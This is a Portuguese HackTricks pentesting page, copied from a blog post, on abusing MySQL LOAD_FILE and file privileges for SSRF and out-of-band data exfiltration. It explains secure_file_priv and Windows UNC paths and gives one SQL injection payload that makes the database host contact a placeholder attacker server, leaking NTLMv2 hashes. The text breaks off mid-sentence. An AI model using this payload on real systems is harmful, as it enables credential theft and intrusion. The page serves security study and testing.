# MySQL File priv para SSRF/RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Post copiado de** [**https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#mysqlmariadbpercona**](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/#mysqlmariadbpercona)

### LOAD\_FILE/LOAD DATA/LOAD XML para SSRF

Todo artigo de exfiltra√ß√£o de dados SQL Out of Band usar√° a fun√ß√£o de string `LOAD_FILE()` para fazer uma solicita√ß√£o de rede. A fun√ß√£o em si tem suas pr√≥prias limita√ß√µes com base no sistema operacional em que √© executada e nas configura√ß√µes com as quais o banco de dados foi iniciado.

Por exemplo, se a vari√°vel global `secure_file_priv` n√£o foi definida, o [valor padr√£o √© definido como `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), o que significa que voc√™ s√≥ pode usar fun√ß√µes como `LOAD_FILE('filename')` ou `LOAD DATA [LOCAL] INFILE 'filename' INTO TABLE tablename` para ler arquivos do diret√≥rio `/var/lib/mysql-files/`. Para poder realizar leituras em arquivos fora deste diret√≥rio, a op√ß√£o `secure_file_priv` deve ser definida como `""`, o que s√≥ pode ser feito atualizando o arquivo de configura√ß√£o do banco de dados ou passando o par√¢metro de inicializa√ß√£o `--secure_file_priv=""` para o servi√ßo de banco de dados.

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/2.png)

No entanto, em circunst√¢ncias em que `secure_file_priv` √© definido como `""`, dever√≠amos ser capazes de ler outros arquivos no sistema, assumindo que as permiss√µes de leitura de arquivos e `file_priv` est√£o definidas como `Y` em `mysql.user` para o usu√°rio do banco de dados atual. No entanto, ser capaz de usar essas fun√ß√µes para fazer chamadas de rede √© muito dependente do sistema operacional. Como essas fun√ß√µes s√£o constru√≠das apenas para ler arquivos, as √∫nicas chamadas relevantes para a rede que podem ser feitas s√£o para caminhos UNC em hosts do Windows, j√° que o [api do Windows `CreateFileA` que √© chamado ao acessar um arquivo entende as conven√ß√µes de nomenclatura UNC](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

Portanto, se o banco de dados de destino estiver sendo executado em uma m√°quina Windows, a consulta de inje√ß√£o `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` [resultaria na m√°quina Windows enviando hashes NTLMv2 na tentativa de autenticar com o `
